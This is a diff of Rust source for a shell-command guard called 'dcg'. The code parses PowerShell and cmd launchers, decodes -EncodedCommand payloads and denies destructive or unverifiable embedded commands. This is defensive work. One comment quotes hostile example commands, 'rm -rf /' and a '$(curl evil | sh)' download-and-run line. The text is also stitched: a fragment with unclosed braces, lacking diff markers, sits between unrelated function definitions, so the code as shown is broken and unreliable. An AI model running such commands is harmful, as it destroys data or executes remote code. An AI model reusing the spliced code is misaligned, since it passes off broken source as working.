+                    VisiblePowerShellScriptBlockSource::Static(source) => source,
+                    VisiblePowerShellScriptBlockSource::Dynamic => {
+                        return Some(EvaluationResult::denied_by_legacy(
+                            "An invoked PowerShell ScriptBlock receives source that dcg cannot statically verify",
+                        ));
+                    }
+                };
+                if nested_command_depth >= MAX_EMBEDDED_SHELL_DEPTH
+                    || source.len() > heredoc_settings.limits.max_body_bytes
+                {
+                    return Some(EvaluationResult::denied_by_legacy(
+                        "An invoked PowerShell ScriptBlock exceeds dcg's bounded static-analysis limit",
+                    ));
+                }
+                let mut result = evaluate_command_with_pack_order_deadline_at_path_inner(
+                    source,
+                    enabled_keywords,
+                    ordered_packs,
+                    keyword_index,
+                    compiled_overrides,
+                    allowlists,
+                    heredoc_settings,
+                    allow_once_audit,
+                    project_path,
+                    deadline,
+                    ShellDialect::PowerShell,
+                    nested_command_depth + 1,
+                    inherited_automated_stdin,
+                );
+                if result.is_denied() {
+                    if let Some(info) = result.pattern_info.as_mut() {
+                        info.reason = format!(
+                            "a later invocation of PowerShell ScriptBlock variable ${name} executes embedded source: {}",
+                            info.reason
+                        );
+                        info.matched_span = None;
+                        info.matched_text_preview = None;
+                    }
+                    return Some(result);
+                }
+                if result.skipped_due_to_budget {
+                    return Some(result);
+                }
+            }
+        }
+    }
+
+    let block_bodies = match powershell_executable_block_bodies(command) {
+        Ok(bodies) => bodies,
+        Err(()) => {
+            return Some(EvaluationResult::denied_by_legacy(
+                "A visible PowerShell executable block has syntax that dcg cannot safely segment",
+            ));
+        }
+    };
+    for body in block_bodies {
+        if let Some(result) = evaluate_visible_powershell_scriptblock_invocations(
+            body,
+            nested_command_depth,
+            enabled_keywords,
+            ordered_packs,
+            keyword_index,
+            compiled_overrides,
+            allowlists,
+            heredoc_settings,
+            allow_once_audit,
+            project_path,
+            deadline,
+            inherited_automated_stdin,
+        ) {
+            return Some(result);
+        }
+    }
+    None
+}
+
+#[inline]
+fn dialect_may_hide_core_git(
+    command: &str,
+    dialect: crate::normalize::ShellDialect,
+    ordered_packs: &[String],
+) -> bool {
+    ordered_packs.iter().any(|pack_id| pack_id == "core.git")
+        && crate::packs::core::git::git_semantic_scan_required(command, dialect)
 }
 
 #[inline]
 fn remaining_below(deadline: Option<&Deadline>, budget: &crate::perf::Budget) -> bool {
     deadline.is_some_and(|d| !d.has_budget_for(budget))
+}
+
+const MAX_WINDOWS_LAUNCHER_PAYLOAD_BYTES: usize = 256 * 1024;
+const MAX_WINDOWS_ENCODED_UTF16_BYTES: usize = MAX_WINDOWS_LAUNCHER_PAYLOAD_BYTES * 2;
+const MAX_WINDOWS_ENCODED_CHARS: usize = 4 * MAX_WINDOWS_ENCODED_UTF16_BYTES.div_ceil(3);
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct WindowsLauncherEnvelope {
+    command: String,
+    dialect: ShellDialect,
+    launcher: &'static str,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum WindowsLauncherParse {
+    NotLauncher,
+    Envelope(WindowsLauncherEnvelope),
+    Unverified(String),
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum PowerShellHostOption {
+    Command,
+    EncodedCommand,
+    NoValue,
+    Value,
+    Unknown,
+}
+
+fn shell_word_value(raw: &str, dialect: ShellDialect) -> Option<String> {
+    let mut decoder = ShellTokenDecoder::new(dialect);
+    decoder
+        .decode(raw, ShellTokenRole::Syntax)
+        .map(std::borrow::Cow::into_owned)
+}
+
+fn powershell_host_option_value(raw: &str, outer_dialect: ShellDialect) -> Option<String> {
+    if outer_dialect != ShellDialect::PowerShell {
+        return shell_word_value(raw, outer_dialect);
+    }
+
+    let raw = raw.trim();
+    let quoted = matches!(raw.as_bytes().first(), Some(b'\'' | b'"'));
+    if !quoted && raw.contains('`') {
+        // A bare PowerShell ParameterToken preserves an embedded backtick
+        // (`-Com`mand` reaches powershell.exe literally and is rejected). A
+        // backtick immediately after the dash changes the token back into an
+        // ordinary expandable word (`-`Command`), and physical line
+        // continuations are removed before native argument binding.
+        let first_byte_escape = raw.starts_with("-`");
+        let only_continuations = {
+            let bytes = raw.as_bytes();
+            let mut index = 0usize;
+            let mut valid = true;
+            while index < bytes.len() {
+                if bytes[index] != b'`' {
+                    index += 1;
+                    continue;
+                }
+                if (index == 1 && bytes.first() == Some(&b'-'))
+                    || bytes.get(index + 1) == Some(&b'\n')
+                {
+                    index += 2;
+                } else if bytes.get(index + 1) == Some(&b'\r')
+                    && bytes.get(index + 2) == Some(&b'\n')
+                {
+                    index += 3;
+                } else {
+                    valid = false;
+                    break;
+                }
+            }
+            valid
+        };
+        if !first_byte_escape && !only_continuations {
+            return None;
+        }
+    }
+
+    shell_word_value(raw, outer_dialect)
+}
+
+fn powershell_host_option(raw: &str, outer_dialect: ShellDialect) -> PowerShellHostOption {
+    let Some(decoded) = powershell_host_option_value(raw, outer_dialect) else {
+        return PowerShellHostOption::Unknown;
+    };
+    let Some(name) = decoded.strip_prefix('-') else {
+        return PowerShellHostOption::Unknown;
+    };
+    let name = name.to_ascii_lowercase();
+    if !name.is_empty() && "command".starts_with(&name) {
+        return PowerShellHostOption::Command;
+    }
+    if !name.is_empty() && "encodedcommand".starts_with(&name) {
+        return PowerShellHostOption::EncodedCommand;
+    }
+
+    const NO_VALUE: &[&str] = &[
+        "help",
+        "interactive",
+        "login",
+        "mta",
+        "noexit",
+        "nologo",
+        "noninteractive",
+        "noprofile",
+        "noprofileloadtime",
+        "sshservermode",
+        "sta",
+    ];
+    if NO_VALUE.iter().any(|option| *option == name) {
+        return PowerShellHostOption::NoValue;
+    }
+
+    const VALUE: &[&str] = &[
+        "configurationfile",
+        "configurationname",
+        "custompipename",
+        "executionpolicy",
+        "inputformat",
+        "outputformat",
+        "settingsfile",
+        "version",
+        "windowstyle",
+        "workingdirectory",
+    ];
+    if VALUE.iter().any(|option| *option == name) {
+        return PowerShellHostOption::Value;
+    }
+
+    // Native PowerShell host parameters accept case-insensitive unique
+    // prefixes. Count names rather than result categories: for example,
+    // `-NoP` is ambiguous between NoProfile and NoProfileLoadTime in current
+    // pwsh and must not be guessed, even though both options take no value.
+    let mut matches = NO_VALUE
+        .iter()
+        .map(|name| (*name, PowerShellHostOption::NoValue))
+        .chain(
+            VALUE
+                .iter()
+                .map(|name| (*name, PowerShellHostOption::Value)),
+        )
+        .filter(|(option, _)| option.starts_with(name.as_str()));
+    let Some((_, option)) = matches.next() else {
+        return PowerShellHostOption::Unknown;
+    };
+    if matches.next().is_some() {
+        PowerShellHostOption::Unknown
+    } else {
+        option
+    }
+}
+
+fn launcher_executable_name(raw: &str, dialect: ShellDialect) -> Option<String> {
+    let decoded = shell_word_value(raw, dialect)?;
+    let basename = decoded.rsplit(['/', '\\']).next()?;
+    let basename = basename.to_ascii_lowercase();
+    Some(
+        basename
+            .strip_suffix(".exe")
+            .unwrap_or(&basename)
+            .to_string(),
+    )
+}
+
+fn is_windows_launcher_name(name: &str) -> bool {
+    matches!(name, "powershell" | "pwsh" | "cmd")
+}
+
+fn dynamic_template_matches(template: &str, candidate: &str) -> bool {
+    let template = template
+        .replace(crate::packs::core::git::POSIX_DYNAMIC_QUOTED, "\0")
+        .replace(crate::packs::core::git::POSIX_DYNAMIC_UNQUOTED, "\0")
+        .to_ascii_lowercase();
+    if !template.contains('\0') {
+        return template == candidate;
+    }
+
+    let starts_with_wildcard = template.starts_with('\0');
+    let ends_with_wildcard = template.ends_with('\0');
+    let fragments: Vec<&str> = template
+        .split('\0')
+        .filter(|part| !part.is_empty())
+        .collect();
+    let mut cursor = 0usize;
+    for (index, fragment) in fragments.iter().enumerate() {
+        if index == 0 && !starts_with_wildcard {
+            if !candidate.starts_with(fragment) {
+                return false;
+            }
+            cursor = fragment.len();
+            continue;
+        }
+        let Some(offset) = candidate[cursor..].find(fragment) else {
+            return false;
+        };
+        cursor += offset + fragment.len();
+    }
+    ends_with_wildcard || cursor == candidate.len()
+}
+
+fn posix_dynamic_view_may_launch_windows_shell(command: &str) -> bool {
+    let tokens = tokenize_for_shell_dialect(command, ShellDialect::Posix);
+    let Some(raw) = tokens
+        .iter()
+        .find(|token| token.kind == NormalizeTokenKind::Word)
+        .and_then(|token| token.text(command))
+    else {
+        return false;
+    };
+    let Some(template) = shell_word_value(raw, ShellDialect::Posix) else {
+        return false;
+    };
+    ["powershell", "pwsh", "cmd"]
+        .iter()
+        .any(|candidate| dynamic_template_matches(&template, candidate))
+}
+
+fn unresolved_posix_segment_may_launch_windows_shell(command: &str) -> bool {
+    let tokens = tokenize_for_shell_dialect(command, ShellDialect::Posix);
+    let Some(raw) = tokens
+        .iter()
+        .find(|token| token.kind == NormalizeTokenKind::Word)
+        .and_then(|token| token.text(command))
+    else {
+        return false;
+    };
+    if launcher_executable_name(raw, ShellDialect::Posix)
+        .is_some_and(|name| is_windows_launcher_name(&name))
+    {
+        return true;
+    }
+    let first_substitution = raw.find("$(").into_iter().chain(raw.find('`')).min();
+    let Some(first_substitution) = first_substitution else {
+        return false;
+    };
+    let prefix = shell_word_value(&raw[..first_substitution], ShellDialect::Posix)
+        .unwrap_or_else(|| raw[..first_substitution].to_string())
+        .to_ascii_lowercase();
+    ["powershell", "pwsh", "cmd"]
+        .iter()
+        .any(|candidate| candidate.starts_with(&prefix))
+}
+
+fn decoded_shell_tail(words: &[&str], start: usize, dialect: ShellDialect) -> Option<String> {
+    let mut decoder = ShellTokenDecoder::new(dialect);
+    let mut decoded = Vec::with_capacity(words.len().saturating_sub(start));
+    for raw in words.iter().skip(start) {
+        if let Some(word) = decoder.decode(raw, ShellTokenRole::Syntax) {
+            decoded.push(word.into_owned());
+        }
+    }
+    (!decoded.is_empty()).then(|| decoded.join(" "))
+}
+
+fn trim_powershell_script_block(command: &str) -> &str {
+    let command = command.trim();
+    command
+        .strip_prefix('{')
+        .and_then(|inner| inner.strip_suffix('}'))
+        .map(str::trim)
+        .unwrap_or(command)
+}
+
+    if let Some(result) = evaluate_sed_shell_sources(
+        &sed_shell_sources,
+        enabled_keywords,
+        ordered_packs,
+        keyword_index,
+        compiled_overrides,
+        allowlists,
+        heredoc_settings,
+        allow_once_audit,
+        project_path,
+        deadline,
+        &mut heredoc_allowlist_hit,
+        nested_command_depth,
+    ) {
+        return result;
+    // Built-in inspection-wrapper exemption (dcg#132).
+    //
+    // A small, hard-coded set of "inspection wrapper" prefixes
+    // (e.g. `ee preflight check --cmd`) consume the trailing destructive
+    // command as data rather than executing it. We must let them through
+    // before pack evaluation, or `dcg` will substring-match the destructive
+    // verb inside the analyzed argument and block the wrapper itself —
+    // exactly the false positive that filed dcg#132. Each prefix is
+    // evaluated by `command_prefix_safely_matches`, which enforces the
+    // same token-boundary + no-shell-chain-metacharacter guard used by
+    // user `command_prefix` allowlists. So a tail like
+    // `--cmd "rm -rf /"` allows through, but
+    // `--cmd "rm -rf /" ; reboot`, `--cmd "$(curl evil | sh)"`, etc.
+    // refuse the exemption and fall through to normal pack evaluation.
+    //
+    // We check both the raw command and the normalized form: the raw form
+    // is the agent-typed string we actually want to recognize; the
+    // normalized form is the belt-and-suspenders fallback if a future
+    // wrapper sneaks in via a path-stripped binary name.
+    if crate::allowlist::is_builtin_inspection_wrapper_call(command)
+        || crate::allowlist::is_builtin_inspection_wrapper_call(&normalized)
+    {
+        return EvaluationResult::allowed();
+
+fn raw_payload_is_outer_powershell_script_block(
+    words: &[&str],
+    start: usize,
+    outer_dialect: ShellDialect,
+) -> bool {
+    if outer_dialect != ShellDialect::PowerShell {
+        return false;
+    }
+    let Some(first) = words.get(start).map(|word| word.trim_start()) else {
+        return false;
+    };
+    let Some(last) = words.last().map(|word| word.trim_end()) else {
+        return false;
+    };
+    first.starts_with('{') && last.ends_with('}')
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum PowerShellHashRole {
+    Comment,
+    Literal,
+    Ambiguous,
+}
+
+fn powershell_hash_role(bytes: &[u8], index: usize) -> PowerShellHashRole {
+    if bytes.get(index) != Some(&b'#') {
+        return PowerShellHashRole::Literal;
+    }
+    if index == 0
+        || bytes[index - 1].is_ascii_whitespace()
+        || matches!(
+            bytes[index - 1],
+            b';' | b'|' | b'&' | b'(' | b')' | b'{' | b'}' | b'[' | b']' | b','
+        )
+    {
+        return PowerShellHashRole::Comment;
+    }
+    if bytes[index - 1].is_ascii_alphanumeric() || bytes[index - 1] == b'_' {
+        return PowerShellHashRole::Literal;
+    }
+    PowerShellHashRole::Ambiguous
+}
+
+fn find_powershell_script_block_close(command: &str, start: usize) -> Option<usize> {
+    let bytes = command.as_bytes();
+    let mut index = start;
+    let mut depth = 1usize;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'`' => index = (index + 2).min(bytes.len()),
+            b'#' if powershell_hash_role(bytes, index) == PowerShellHashRole::Comment => {
+                index = command[index..]
+                    .find('\n')
+                    .map_or(bytes.len(), |newline| index + newline + 1);
+            }
+            b'<' if bytes.get(index + 1) == Some(&b'#') => {
+                index = skip_powershell_block_comment(command, index);
+            }
+            b'\'' => index = skip_powershell_single_quote(command, index),
+            b'"' => {
+                index += 1;
+                while index < bytes.len() {
+                    if bytes[index] == b'`' {
+                        index = (index + 2).min(bytes.len());
+                    } else if bytes[index] == b'"' {
+                        index += 1;
+                        break;
+                    } else if bytes[index] == b'$' && bytes.get(index + 1) == Some(&b'(') {
+                        index = find_powershell_subexpression_close(command, index + 2).ok()? + 1;
+                    } else {
+                        index += 1;
+                    }
+                }
+            }
+            b'@' if matches!(bytes.get(index + 1), Some(b'\'' | b'"')) => {
+                index =
+                    powershell_here_string_end(command, index).map_or(index + 1, |(_, _, end)| end);
+            }
+            b'{' => {
+                depth += 1;
+                index += 1;
+            }
+            b'}' => {
+                depth -= 1;
+                if depth == 0 {
+                    return Some(index);
+                }
+                index += 1;
+            }
+            _ => index += 1,
+        }
+    }
+    None
+}
+
+fn is_static_powershell_script_block_expression(command: &str) -> bool {
+    let command = command.trim();
+    command.starts_with('{')
+        && find_powershell_script_block_close(command, 1)
+            .is_some_and(|close| command[close + 1..].trim().is_empty())
+}
+
+fn powershell_payload_is_dynamic(command: &str) -> bool {
+    let bytes = command.as_bytes();
+    let mut index = 0usize;
+    let mut in_single = false;
+    let mut in_double = false;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'`' if !in_single => {
+                index = (index + 2).min(bytes.len());
+                continue;
+            }
+            b'\'' if !in_double => in_single = !in_single,
+            b'"' if !in_single => in_double = !in_double,
+            b'$' if !in_single => return true,
+            _ => {}
+        }
+        index += 1;
+    }
+    false
+}
+
+fn cmd_payload_is_dynamic(command: &str) -> bool {
+    let bytes = command.as_bytes();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        if bytes[index] == b'^' {
+            index = (index + 2).min(bytes.len());
+            continue;
+        }
+        if matches!(bytes[index], b'%' | b'!') {
+            let delimiter = bytes[index];
+            if bytes[index + 1..].contains(&delimiter)
+                || delimiter == b'%' && bytes.get(index + 1).is_some_and(u8::is_ascii_alphanumeric)
+            {
+                return true;
+            }
+        }
+        index += 1;
+    }
+    false
+}
+
+fn validate_launcher_payload(
+    command: String,
+    dialect: ShellDialect,
+    max_payload_bytes: usize,
+) -> Result<String, String> {
+    let command = command.trim().to_string();
+    if command.is_empty() {
+        return Err("embedded launcher command is empty".to_string());
+    }
+    if command.len() > max_payload_bytes {
+        return Err(format!(
+            "embedded launcher command exceeds the {max_payload_bytes}-byte analysis limit"
+        ));
+    }
+    let dynamic = match dialect {
+        ShellDialect::PowerShell => powershell_payload_is_dynamic(&command),
+        ShellDialect::Cmd => cmd_payload_is_dynamic(&command),
+        ShellDialect::Posix | ShellDialect::Unknown => false,
+    };
+    if dynamic {
+        return Err(format!(
+            "embedded {dialect:?} launcher command contains runtime expansion that dcg cannot statically verify"
+        ));
+    }
+    Ok(command)
+}
+
+fn decode_powershell_encoded_payload(
+    encoded: &str,
+    max_payload_bytes: usize,
+) -> Result<String, String> {
+    use base64::Engine;
+
+    if encoded.is_empty() {
+        return Err("PowerShell -EncodedCommand payload is empty".to_string());
+    }
+    if encoded.len() > MAX_WINDOWS_ENCODED_CHARS {
+        return Err(format!(
+            "PowerShell -EncodedCommand token exceeds the {MAX_WINDOWS_ENCODED_CHARS}-character limit"
+        ));
+    }
+    let bytes = base64::engine::general_purpose::STANDARD
+        .decode(encoded)
+        .map_err(|_| {
+            "PowerShell -EncodedCommand payload is not valid standard base64".to_string()
+        })?;
+    if bytes.len() > MAX_WINDOWS_ENCODED_UTF16_BYTES {
+        return Err(format!(
+            "PowerShell -EncodedCommand UTF-16 payload exceeds the {MAX_WINDOWS_ENCODED_UTF16_BYTES}-byte limit"
+        ));
+    }
+    if bytes.len() % 2 != 0 {
+        return Err("PowerShell -EncodedCommand payload has odd UTF-16LE length".to_string());
+    }
+    let units: Vec<u16> = bytes
+        .chunks_exact(2)
+        .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
+        .collect();
+    let decoded = String::from_utf16(&units)
+        .map_err(|_| "PowerShell -EncodedCommand payload is not valid UTF-16LE".to_string())?;
+    if decoded.contains('\0') {
+        return Err("PowerShell -EncodedCommand payload contains NUL".to_string());
+    }
+    validate_launcher_payload(decoded, ShellDialect::PowerShell, max_payload_bytes)
+}
+
+fn parse_powershell_launcher(
+    words: &[&str],
+    outer_dialect: ShellDialect,
+    max_payload_bytes: usize,
+) -> WindowsLauncherParse {
+    let mut index = 1usize;
+    while let Some(raw) = words.get(index) {
+        match powershell_host_option(raw, outer_dialect) {
+            PowerShellHostOption::Command => {
+                if words
+                    .get(index + 1)
+                    .and_then(|raw| shell_word_value(raw, outer_dialect))
+                    .is_some_and(|payload| payload == "-")
+                {
+                    return WindowsLauncherParse::Unverified(
+                        "PowerShell -Command - executes commands read dynamically from stdin"
+                            .to_string(),
+                    );
+                }
+                let Some(command) = decoded_shell_tail(words, index + 1, outer_dialect) else {
+                    return WindowsLauncherParse::Unverified(
+                        "PowerShell -Command has no statically inspectable payload".to_string(),
+                    );
+                };
+                let command = if raw_payload_is_outer_powershell_script_block(
+                    words,
+                    index + 1,
+                    outer_dialect,
+                ) {
+                    trim_powershell_script_block(&command).to_string()
+                } else {
+                    command
+                };
+                return match validate_launcher_payload(
+                    command,
+                    ShellDialect::PowerShell,
+                    max_payload_bytes,
+                ) {
+                    Ok(command) => WindowsLauncherParse::Envelope(WindowsLauncherEnvelope {
+                        command,
+                        dialect: ShellDialect::PowerShell,
+                        launcher: "PowerShell -Command",
+                    }),
+                    Err(reason) => WindowsLauncherParse::Unverified(reason),
+                };
+            }
+            PowerShellHostOption::EncodedCommand => {
+                let Some(raw_payload) = words.get(index + 1) else {
+                    return WindowsLauncherParse::Unverified(
+                        "PowerShell -EncodedCommand has no payload".to_string(),
+                    );
+                };
+                let Some(encoded) = shell_word_value(raw_payload, outer_dialect) else {
+                    return WindowsLauncherParse::Unverified(
+                        "PowerShell -EncodedCommand payload cannot be decoded from the outer shell"
+                            .to_string(),
+                    );
+                };
+                return match decode_powershell_encoded_payload(&encoded, max_payload_bytes) {
+                    Ok(command) => WindowsLauncherParse::Envelope(WindowsLauncherEnvelope {
+                        command,
+                        dialect: ShellDialect::PowerShell,
+                        launcher: "PowerShell -EncodedCommand",
+                    }),
+                    Err(reason) => WindowsLauncherParse::Unverified(reason),
+                };
+            }
+            PowerShellHostOption::NoValue => index += 1,
+            PowerShellHostOption::Value => {
+                if words.get(index + 1).is_none() {
+                    return WindowsLauncherParse::Unverified(format!(
+                        "PowerShell host option {raw:?} is missing its value"
+                    ));
+                }
+                index += 2;
+            }
+            PowerShellHostOption::Unknown => {
+                if raw.trim_start().starts_with('-') {
+                    return WindowsLauncherParse::Unverified(format!(
+                        "PowerShell host option {raw:?} is unknown or ambiguous"
+                    ));
+                }
+                return WindowsLauncherParse::NotLauncher;
+            }
+        }
+    }
+    WindowsLauncherParse::NotLauncher
+}
+
+fn cmd_host_switch(raw: &str, outer_dialect: ShellDialect) -> Option<String> {
+    shell_word_value(raw, outer_dialect).map(|word| word.to_ascii_lowercase())
+}
+
+fn cmd_switch_is_non_executing(option: &str) -> bool {
+    matches!(option, "/d" | "/q" | "/a" | "/u" | "/s" | "/?")
+        || ["/e:", "/f:", "/v:"]
+            .iter()
+            .any(|prefix| option.starts_with(prefix))
+}
+
+fn parse_cmd_launcher(
+    words: &[&str],
+    outer_dialect: ShellDialect,
+    max_payload_bytes: usize,
+) -> WindowsLauncherParse {
+    let mut index = 1usize;
+    while let Some(raw) = words.get(index) {
+        let Some(option) = cmd_host_switch(raw, outer_dialect) else {
+            return WindowsLauncherParse::NotLauncher;
+        };
+        if matches!(option.as_str(), "/c" | "/k") {
+            let Some(command) = decoded_shell_tail(words, index + 1, outer_dialect) else {
+                return WindowsLauncherParse::Unverified(format!(
+                    "cmd {option} has no statically inspectable payload"
+                ));
+            };
+            return match validate_launcher_payload(command, ShellDialect::Cmd, max_payload_bytes) {
+                Ok(command) => WindowsLauncherParse::Envelope(WindowsLauncherEnvelope {
+                    command,
+                    dialect: ShellDialect::Cmd,
+                    launcher: if option == "/c" { "cmd /c" } else { "cmd /k" },
+                }),
+                Err(reason) => WindowsLauncherParse::Unverified(reason),
+            };
+        }
+        if !cmd_switch_is_non_executing(&option) {
+            if option.starts_with('/') {
+                return WindowsLauncherParse::Unverified(format!(
+                    "cmd host switch {raw:?} is unknown"
+                ));
+            }
+            return WindowsLauncherParse::NotLauncher;
+        }
+        index += 1;
+    }
+    WindowsLauncherParse::NotLauncher
+}
+
+fn parse_windows_launcher_segment(
+    segment: &str,
+    outer_dialect: ShellDialect,
+    max_payload_bytes: usize,
+) -> WindowsLauncherParse {
+    let segment = segment.trim();
+    let segment = segment
+        .strip_prefix('&')
+        .filter(|rest| rest.chars().next().is_some_and(char::is_whitespace))
+        .map(str::trim_start)
+        .unwrap_or(segment);
+
+    if outer_dialect == ShellDialect::Cmd {
+        if let Some(command) = segment.strip_prefix('@') {
+            return match validate_launcher_payload(
+                command.trim_start().to_string(),
+                ShellDialect::Cmd,
+                max_payload_bytes,
+            ) {
+                Ok(command) => WindowsLauncherParse::Envelope(WindowsLauncherEnvelope {
+                    command,
+                    dialect: ShellDialect::Cmd,
+                    launcher: "cmd @ echo-suppressed command",
+                }),
+                Err(reason) => WindowsLauncherParse::Unverified(reason),
+            };
+        }
+    }
+
+    let stripped_posix =
+        (outer_dialect == ShellDialect::Posix).then(|| strip_wrapper_prefixes(segment));
+    let segment = stripped_posix
+        .as_ref()
+        .map_or(segment, |stripped| stripped.normalized.as_ref());
+    let mut static_substitution = None;
+    if outer_dialect == ShellDialect::Posix && (segment.contains("$(") || segment.contains('`')) {
+        match crate::packs::core::git::posix_substitution_view(segment) {
+            Ok(view) if view.has_dynamic => {
+                if posix_dynamic_view_may_launch_windows_shell(&view.command) {
+                    return WindowsLauncherParse::Unverified(
+                        "POSIX command substitution dynamically assembles a shell launcher"
+                            .to_string(),
+                    );
+                }
+            }
+            Ok(view) => static_substitution = Some(view.command),
+            Err(()) => {
+                if unresolved_posix_segment_may_launch_windows_shell(segment) {
+                    return WindowsLauncherParse::Unverified(
+                        "POSIX shell launcher assembly cannot be statically verified".to_string(),
+                    );
+                }
+            }
+        }
+    }
+    let segment = static_substitution.as_deref().unwrap_or(segment);
+    let tokens = tokenize_for_shell_dialect(segment, outer_dialect);
+    if tokens
+        .iter()
+        .any(|token| token.kind == NormalizeTokenKind::Separator)
+    {
+        return WindowsLauncherParse::NotLauncher;
+    }
+    let words: Vec<&str> = tokens
+        .iter()
+        .filter(|token| token.kind == NormalizeTokenKind::Word)
+        .filter_map(|token| token.text(segment))
+        .collect();
+    let Some(executable) = words
+        .first()
+        .and_then(|raw| launcher_executable_name(raw, outer_dialect))
+    else {
+        return WindowsLauncherParse::NotLauncher;
+    };
+    match executable.as_str() {
+        "powershell" | "pwsh" => {
+            parse_powershell_launcher(&words, outer_dialect, max_payload_bytes)
+        }
+        "cmd" => parse_cmd_launcher(&words, outer_dialect, max_payload_bytes),
+        "call" if outer_dialect == ShellDialect::Cmd => {
+            let Some(command) = decoded_shell_tail(&words, 1, outer_dialect) else {
+                return WindowsLauncherParse::Unverified(
+                    "cmd call has no statically inspectable payload".to_string(),
+                );
+            };
+            match validate_launcher_payload(command, ShellDialect::Cmd, max_payload_bytes) {
+                Ok(command) => WindowsLauncherParse::Envelope(WindowsLauncherEnvelope {
+                    command,
+                    dialect: ShellDialect::Cmd,
+                    launcher: "cmd call",
+                }),
+                Err(reason) => WindowsLauncherParse::Unverified(reason),
+            }
+        }
+        _ => WindowsLauncherParse::NotLauncher,
+    }
+}
+
+fn windows_launcher_envelopes(
+    command: &str,
+    outer_dialect: ShellDialect,
+    max_payload_bytes: usize,
+) -> Result<(Vec<WindowsLauncherEnvelope>, bool), String> {
+    let segments = crate::packs::split_command_segments_in_dialect(command, outer_dialect);
+    let candidate_dialects: &[ShellDialect] = if outer_dialect == ShellDialect::Unknown {
+        &[
+            ShellDialect::Posix,
+            ShellDialect::PowerShell,
+            ShellDialect::Cmd,
+        ]
+    } else {
+        std::slice::from_ref(&outer_dialect)
+    };
+    let mut envelopes = Vec::new();
+    let mut all_segments_are_envelopes = !segments.is_empty();
+
+    for segment in segments {
+        let mut segment_envelopes = Vec::new();
+        let mut unverified = None;
+        for &candidate in candidate_dialects {
+            match parse_windows_launcher_segment(segment, candidate, max_payload_bytes) {
+                WindowsLauncherParse::NotLauncher => {}
+                WindowsLauncherParse::Envelope(envelope) => {
+                    if !segment_envelopes.contains(&envelope) {
+                        segment_envelopes.push(envelope);
+                    }
+                }
+                WindowsLauncherParse::Unverified(reason) => unverified = Some(reason),
+            }
+        }
+        // Unknown-mode parsing is a conservative union of viable shell
+        // interpretations. A valid envelope in one dialect cannot make an
+        // unverifiable interpretation in another dialect safe: the caller
+        // has not supplied enough provenance to choose between them.
+        if let Some(reason) = unverified {
+            return Err(reason);
+        }
+        if segment_envelopes.is_empty() {
+            all_segments_are_envelopes = false;
+        } else {
+            envelopes.extend(segment_envelopes);
+        }
+    }
+    Ok((envelopes, all_segments_are_envelopes))
+}
+
+#[allow(clippy::too_many_arguments)]
+fn evaluate_windows_launcher_envelopes(
+    command: &str,
+    outer_dialect: ShellDialect,
+    nested_command_depth: usize,
+    enabled_keywords: &[&str],
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    compiled_overrides: &crate::config::CompiledOverrides,
+    allowlists: &LayeredAllowlist,
+    heredoc_settings: &crate::config::HeredocSettings,
+    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
+    project_path: Option<&Path>,
+    deadline: Option<&Deadline>,
+    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
+    inherited_automated_stdin: bool,
+) -> Option<EvaluationResult> {
+    // A quoted POSIX heredoc that feeds a proven data sink suppresses outer
+    // shell expansion. Mask those literal bodies before launcher discovery so
+    // text such as `$(rm ...)` cannot be mistaken for dynamic construction of
+    // a Windows shell launcher. Expanding heredocs and executing targets stay
+    // visible, preserving the fail-closed path for real substitutions.
+    let launcher_source = match outer_dialect {
+        ShellDialect::Posix | ShellDialect::Unknown => {
+            crate::heredoc::mask_non_expanding_data_heredocs(command)
+        }
+        ShellDialect::PowerShell | ShellDialect::Cmd => std::borrow::Cow::Borrowed(command),
+    };
+    let launcher_source = launcher_source.as_ref();
+    let lower = launcher_source.to_ascii_lowercase();
+    let escaped_launcher_may_be_present = match outer_dialect {
+        ShellDialect::PowerShell => launcher_source.contains('`'),
+        ShellDialect::Cmd => launcher_source.contains('^'),
+        ShellDialect::Posix => {
+            launcher_source.contains('\\')
+                || launcher_source.contains("$'")
+                || launcher_source.contains("$\"")
+                || launcher_source.contains("$(")
+        }
+        ShellDialect::Unknown => {
+            launcher_source.contains('`')
+                || launcher_source.contains('^')
+                || launcher_source.contains('\\')
+                || launcher_source.contains("$(")
+        }
+    };
+    let cmd_envelope_may_be_present =
+        matches!(outer_dialect, ShellDialect::Cmd | ShellDialect::Unknown)
+            && (lower.contains("call ") || launcher_source.contains('@'));
+    if !escaped_launcher_may_be_present
+        && !cmd_envelope_may_be_present
+        && !["powershell", "pwsh", "cmd"]
+            .iter()
+            .any(|launcher| lower.contains(launcher))
+    {
+        return None;
+    }
+    let max_payload_bytes = heredoc_settings
+        .limits
+        .max_body_bytes
+        .min(MAX_WINDOWS_LAUNCHER_PAYLOAD_BYTES);
+    let (envelopes, all_segments_are_envelopes) =
+        match windows_launcher_envelopes(launcher_source, outer_dialect, max_payload_bytes) {
+            Ok(scan) => scan,
+            Err(reason) => {
+                return Some(EvaluationResult::denied_by_legacy(&format!(
+                    "Embedded shell launcher cannot be statically verified: {reason}"
+                )));
+            }
+        };
+
+    for envelope in envelopes {
+        let mut result = evaluate_command_with_pack_order_deadline_at_path_inner(
+            &envelope.command,
+            enabled_keywords,
+            ordered_packs,
+            keyword_index,
+            compiled_overrides,
+            allowlists,
+            heredoc_settings,
+            allow_once_audit,
+            project_path,
+            deadline,
+            envelope.dialect,
+            nested_command_depth + 1,
+            inherited_automated_stdin,
+        );
+        if result.skipped_due_to_budget {
+            return Some(EvaluationResult::denied_by_legacy(&format!(
+                "{} payload exceeded dcg's static-analysis deadline",
+                envelope.launcher
+            )));
+        }
+        if result.is_denied() {
+            if let Some(info) = result.pattern_info.as_mut() {
+                info.reason = format!(
+                    "{} executes an embedded command: {}",
+                    envelope.launcher, info.reason
+                );
+                // The nested evaluator's offsets refer to decoded/derived
+                // content, not the outer command bytes.
+                info.matched_span = None;
+                info.matched_text_preview = None;
+            }
+            return Some(result);
+        }
+        if first_allowlist_hit.is_none() {
